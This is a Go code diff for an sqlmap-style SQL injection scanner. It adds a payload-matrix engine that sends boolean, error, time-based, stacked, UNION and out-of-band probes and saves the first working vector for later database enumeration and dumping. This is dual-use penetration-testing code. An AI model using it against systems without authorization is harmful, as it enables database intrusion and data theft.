@@ -18,6 +18,7 @@ import (
 	"github.com/0xseif-code/vexor/internal/sqli/common"
 	"github.com/0xseif-code/vexor/internal/sqli/dbms"
 	"github.com/0xseif-code/vexor/internal/sqli/injection"
+	"github.com/0xseif-code/vexor/internal/sqli/payloads"
 	"github.com/0xseif-code/vexor/internal/sqli/tamper"
 	"github.com/0xseif-code/vexor/internal/sqli/techniques"
 	"github.com/0xseif-code/vexor/internal/sqli/ui"
@@ -106,10 +107,19 @@ type Detector struct {
 	skipRemaining  atomic.Bool
 	heuristicAsked atomic.Bool
 
+	// continueAsked guards the one-shot "do you want to keep testing the other
+	// parameters" prompt shown after the first confirmed vulnerable parameter.
+	continueAsked atomic.Bool
+
 	// wafAsked guards the one-shot WAF tamper prompt; tamperChain holds the
 	// recommended chain (if accepted) applied to confirmed payloads.
-	wafAsked   atomic.Bool
+	wafAsked    atomic.Bool
 	tamperChain *tamper.Chain
+
+	// matrixWork records the first payload-matrix vector that confirmed, so
+	// subsequent enumeration/dump phases can reuse the working injection
+	// structure without re-scanning.
+	matrixWork atomic.Pointer[matrixHit]
 }
 
 // New builds a Detector with defaults applied.
@@ -444,8 +454,51 @@ func (d *Detector) scanPoint(ctx context.Context, pt *InjectionPoint, db string,
 			return
 		}
 		d.progress("  [+] %s technique seems to be usable (confidence: %d%%) on %s", res.Technique, res.Confidence, pt.Location)
+
+		// After the first confirmed vulnerable parameter, ask whether to keep
+		// testing the remaining parameters (if any). Answering no (or hitting
+		// Enter) skips the rest and lets the caller proceed straight to
+		// enumeration/dump. Batch mode defaults to no, as does any non-TTY
+		// stdin, mirroring sqlmap's --batch behaviour of moving to exploitation.
+		if d.continueAsked.CompareAndSwap(false, true) && !d.skipRemaining.Load() {
+			if !ui.AskYesNo(fmt.Sprintf("GET parameter %q is vulnerable. Do you want to keep testing the others (if any)?", pt.Name), false) {
+				d.skipRemaining.Store(true)
+				d.progress("  keeping only the confirmed parameter %q; remaining parameters skipped", pt.Name)
+			}
+		}
 		return
 	}
+
+	// The standard techniques found nothing. Fall through to the exhaustive,
+	// version-aware payload matrix engine, which generates wrapped probes
+	// across every DBMS version branch (level 1 = high-probability subset,
+	// level 3 = full matrix). Logs every tested payload with a descriptive
+	// title and returns the first confirmed injection.
+	if ctx.Err() != nil {
+		return
+	}
+	res := d.runMatrixEngine(ctx, pt, runner, db)
+	if res == nil {
+		return
+	}
+	d.findings.Add(1)
+	payload := res.Payload
+	if d.tamperChain != nil && payload != "" {
+		payload = d.tamperChain.Apply(payload)
+	}
+	select {
+	case det <- Detection{
+		Point:      *pt,
+		Technique:  res.Technique,
+		DBMS:       res.DB,
+		Payload:    payload,
+		Evidence:   res.Evidence,
+		Confidence: res.Confidence,
+	}:
+	case <-ctx.Done():
+		return
+	}
+	d.progress("  [matrix] %s technique usable (confidence: %d%%) on %s", res.Technique, res.Confidence, pt.Location)
 }
 
 func (d *Detector) payloadSets(db string) []*dbms.Payloads {
@@ -594,4 +647,315 @@ func (d *Detector) Stats() Stats {
 		StartedAt: startAt,
 		Elapsed:   elapsed,
 	}
+}
+
+// ---------------------------------------------------------------------------
+// Version-Aware Payload Matrix Engine
+// ---------------------------------------------------------------------------
+
+// MatrixResult is a single confirmed injection produced by the payload-matrix
+// probe loop. It augments techniques.Result with the descriptive matrix title
+// so callers can name the exact vector that fired.
+type MatrixResult struct {
+	techniques.Result
+	Title string
+}
+
+// matrixHits is a stored working-payload structure for enumeration/dump reuse.
+// The detector records the first confirmed vector so downstream phases can
+// re-render extraction payloads without re-scanning.
+type matrixHit struct {
+	Title    string
+	Payload  payloads.Payload
+	Rendered string
+	DBMS     string
+}
+
+// runMatrixEngine drives the version-aware payload matrix against the injection
+// point. It selects the eligible vectors (by --dbms, --risk and --level),
+// expands each through the wrapper engine, and logs EVERY tested probe with its
+// timestamp and descriptive title.
+//
+//	[HH:MM:SS] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE clause (EXTRACTVALUE)'
+//	[HH:MM:SS] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind - WHERE clause (SLEEP)'
+//
+// On the first confirmed injection it logs the hit, records the working payload
+// structure for subsequent enumeration/dump, and returns immediately.
+func (d *Detector) runMatrixEngine(ctx context.Context, pt *injection.InjectionPoint, r *techniques.Runner, db string) *techniques.Result {
+	opt := payloads.SelectOptions{Level: d.cfg.Level, Risk: d.cfg.Risk}
+	if db != "" && db != dbms.Generic {
+		opt.DBMS = db
+	}
+	if d.filterDB != "" {
+		opt.DBMS = d.filterDB
+	}
+	selected := payloads.Select(opt)
+	if len(selected) == 0 {
+		return nil
+	}
+
+	level := d.cfg.Level
+	if level < 1 {
+		level = 1
+	}
+	delay := d.sleepSeconds()
+	m := payloads.DefaultMacro()
+	m.Orig = pt.Value
+	m.Seconds = delay
+	m.Query = "VERSION()"
+
+	// Pre-compute the total probe budget for a progress line (and to satisfy
+	// the "level 1 ~15-20 probes, level 3 >100 probes" sizing contract).
+	budget := 0
+	for _, p := range selected {
+		budget += payloads.ExpandCount(p, level, m)
+	}
+	d.progress("  matrix engine: %d vectors selected (risk<=%d, level=%d) -> ~%d probes", len(selected), d.cfg.Risk, level, budget)
+
+	tested := 0
+	for _, p := range selected {
+		if ctx.Err() != nil {
+			return nil
+		}
+		for _, rendered := range payloads.Expand(p, level, m) {
+			if ctx.Err() != nil {
+				return nil
+			}
+			tested++
+
+			// Verbose per-probe log with descriptive title (timestamped by
+			// the shared logger), matching sqlmap's probe-stream format.
+			ui.Info("testing '%s'", rendered.Source.Title)
+
+			res := d.testMatrixRendered(ctx, pt, r, rendered, db)
+			if res != nil {
+				d.recordMatrixHit(matrixHit{
+					Title:    rendered.Source.Title,
+					Payload:  rendered.Source,
+					Rendered: rendered.Rendered,
+					DBMS:     res.DB,
+				})
+				ui.Info("[+] %s parameter %q is '%s' injectable", pt.Type, pt.Name, rendered.Source.Title)
+				d.progress("  [+] matrix hit: %s technique on %s (probe %d/%d)", rendered.Source.Technique, pt.Location, tested, budget)
+				return res
+			}
+		}
+	}
+
+	d.progress("  matrix engine complete: %d probes, no injection found", tested)
+	return nil
+}
+
+// testMatrixRendered sends a single expanded probe and detects a confirmation
+// using technique-specific logic. The DB name preference (from OOB / error
+// signatures) is honored when a match reports one.
+func (d *Detector) testMatrixRendered(ctx context.Context, pt *injection.InjectionPoint, r *techniques.Runner, rp payloads.RenderedPayload, db string) *techniques.Result {
+	payload := rp.Rendered
+	switch rp.Source.Technique {
+	case payloads.TechBoolean, payloads.TechInline:
+		return d.testMatrixBool(ctx, pt, r, rp, db)
+	case payloads.TechError:
+		return d.testMatrixError(ctx, pt, r, rp, db)
+	case payloads.TechTime:
+		return d.testMatrixTime(ctx, pt, r, payload, db)
+	case payloads.TechStacked:
+		return d.testMatrixStacked(ctx, pt, r, payload, db)
+	case payloads.TechUnion:
+		return d.testMatrixUnion(ctx, pt, r, payload, db)
+	case payloads.TechOOB:
+		return d.testMatrixOOB(ctx, pt, r, rp, db)
+	}
+	return nil
+}
+
+// testMatrixBool renders both the true probe and a negated false variant built
+// from the rendered probe's boolean atom (AND 1=1 -> AND 1=2) and checks for the
+// classic signature divergence. Confirmations require the true probe to
+// reproduce the baseline while the false probe diverges.
+func (d *Detector) testMatrixBool(ctx context.Context, pt *injection.InjectionPoint, r *techniques.Runner, rp payloads.RenderedPayload, db string) *techniques.Result {
+	falsePayload := flipRendered(rp.Rendered)
+	if falsePayload == rp.Rendered {
+		return nil
+	}
+	rrTrue := pt.Render(rp.Rendered)
+	rrFalse := pt.Render(falsePayload)
+	if rrTrue == nil || rrFalse == nil {
+		return nil
+	}
+
+	n := r.SampleCount()
+	ts, ok1 := r.SampleN(ctx, rrTrue, n)
+	fs, ok2 := r.SampleN(ctx, rrFalse, n)
+	if !ok1 || !ok2 {
+		return nil
+	}
+
+	tAvg := avgSamples(ts)
+	fAvg := avgSamples(fs)
+	diff := tAvg - fAvg
+	if tAvg >= 0.78 && diff >= 0.18 && fAvg <= 0.85 {
+		conf := 85
+		if diff >= 0.35 {
+			conf += 5
+		}
+		return &techniques.Result{
+			Technique:  string(rp.Source.Technique),
+			DB:         db,
+			Payload:    rp.Rendered,
+			Evidence:   fmt.Sprintf("matrix %s: true %.2f vs false %.2f", rp.Source.Technique, tAvg, fAvg),
+			Confidence: conf,
+		}
+	}
+	return nil
+}
+
+// testMatrixError sends the probe and matches the response against known DBMS
+// error signatures.
+func (d *Detector) testMatrixError(ctx context.Context, pt *injection.InjectionPoint, r *techniques.Runner, rp payloads.RenderedPayload, db string) *techniques.Result {
+	rr := pt.Render(rp.Rendered)
+	if rr == nil {
+		return nil
+	}
+	resp, err := common.Do(ctx, r.Client, r.Cfg.Throttle, rr.Method, rr.URL, rr.Body, rr.Headers, r.Cfg.Timeout, r.Cfg.Meter)
+	if err != nil {
+		return nil
+	}
+	if name, ev := dbms.MatchError(resp.Body); ev != "" {
+		const maxEv = 100
+		if len(ev) > maxEv {
+			ev = ev[:maxEv]
+		}
+		return &techniques.Result{
+			Technique:  techniques.TechError,
+			DB:         name,
+			Payload:    rp.Rendered,
+			Evidence:   "DBMS error signature: " + ev,
+			Confidence: 90,
+		}
+	}
+	return nil
+}
+
+// testMatrixTime sends the probe three times and confirms a consistent latency
+// lift over the baseline.
+func (d *Detector) testMatrixTime(ctx context.Context, pt *injection.InjectionPoint, r *techniques.Runner, payload string, db string) *techniques.Result {
+	delta, ok := r.RobustDelay(ctx, payload)
+	if !ok {
+		return nil
+	}
+	conf := 90
+	if delta >= 4*time.Second {
+		conf = 95
+	}
+	return &techniques.Result{
+		Technique:  techniques.TechTime,
+		DB:         db,
+		Payload:    payload,
+		Evidence:   fmt.Sprintf("matrix time-based: +%s vs baseline", delta.Round(time.Millisecond)),
+		Confidence: conf,
+	}
+}
+
+// testMatrixStacked sends a stacked-query probe and confirms time-wise.
+func (d *Detector) testMatrixStacked(ctx context.Context, pt *injection.InjectionPoint, r *techniques.Runner, payload string, db string) *techniques.Result {
+	delta, ok := r.RobustDelay(ctx, payload)
+	if !ok {
+		return nil
+	}
+	return &techniques.Result{
+		Technique:  techniques.TechStacked,
+		DB:         db,
+		Payload:    payload,
+		Evidence:   fmt.Sprintf("stacked statement executed (secondary statement delayed +%s)", delta.Round(time.Millisecond)),
+		Confidence: 88,
+	}
+}
+
+// testMatrixUnion renders the probe and checks the response signature against
+// the baseline for UNION-based reflection.
+func (d *Detector) testMatrixUnion(ctx context.Context, pt *injection.InjectionPoint, r *techniques.Runner, payload string, db string) *techniques.Result {
+	rr := pt.Render(payload)
+	if rr == nil {
+		return nil
+	}
+	s, ok := r.Once(ctx, rr)
+	if !ok {
+		return nil
+	}
+	if s.Sim >= 0.85 {
+		return &techniques.Result{
+			Technique:  techniques.TechUnion,
+			DB:         db,
+			Payload:    payload,
+			Evidence:   "UNION accepted (response matches baseline layout)",
+			Confidence: 60,
+		}
+	}
+	return nil
+}
+
+// testMatrixOOB dispatches the OOB probe (external confirmation on --oob-domain).
+func (d *Detector) testMatrixOOB(ctx context.Context, pt *injection.InjectionPoint, r *techniques.Runner, rp payloads.RenderedPayload, db string) *techniques.Result {
+	if d.cfg.OOBDomain == "" {
+		return nil
+	}
+	rr := pt.Render(rp.Rendered)
+	if rr == nil {
+		return nil
+	}
+	if _, ok := r.Once(ctx, rr); !ok {
+		return nil
+	}
+	return &techniques.Result{
+		Technique:  techniques.TechOOB,
+		DB:         db,
+		Payload:    rp.Rendered,
+		Evidence:   "OOB payload dispatched; confirm the callback on " + d.cfg.OOBDomain,
+		Confidence: 60,
+	}
+}
+
+// recordMatrixHit stores the working payload structure so enumeration/dump can
+// reuse the confirmed vector without re-scanning. Keeps only the first hit.
+func (d *Detector) recordMatrixHit(h matrixHit) {
+	if d.matrixWork.Load() != nil {
+		return
+	}
+	d.matrixWork.Store(&h)
+}
+
+// avgSamples averages the baseline-similarity of a probe sample set.
+func avgSamples(samples []techniques.Sample) float64 {
+	if len(samples) == 0 {
+		return 0
+	}
+	var sum float64
+	for _, s := range samples {
+		sum += s.Sim
+	}
+	return sum / float64(len(samples))
+}
+
+// flipRendered negates the boolean atom embedded in an already-rendered probe
+// (1=1 -> 1=2, '1'='1 -> '1'='2, 'a'='a -> 'a'='b, <=>1 -> <=>2, ...) so the
+// boolean technique can compare a true probe against a false one built from the
+// exact same wrapper. It returns the input unchanged when no flippable atom is
+// present (the caller then skips boolean evaluation).
+func flipRendered(rendered string) string {
+	replacements := []struct{ from, to string }{
+		{"1=1", "1=2"},
+		{"'1'='1'", "'1'='2'"},
+		{"'1'='1", "'1'='2"},
+		{"'a'='a'", "'a'='b'"},
+		{"'a'='a", "'a'='b"},
+		{"<=>1", "<=>2"},
+		{"BETWEEN 1 AND 1", "BETWEEN 2 AND 1"},
+		{"sqlite_version()=sqlite_version()", "sqlite_version()!=sqlite_version()"},
+	}
+	for _, r := range replacements {
+		if idx := strings.Index(rendered, r.from); idx >= 0 {
+			return rendered[:idx] + r.to + rendered[idx+len(r.from):]
+		}
+	}
+	return rendered
 }
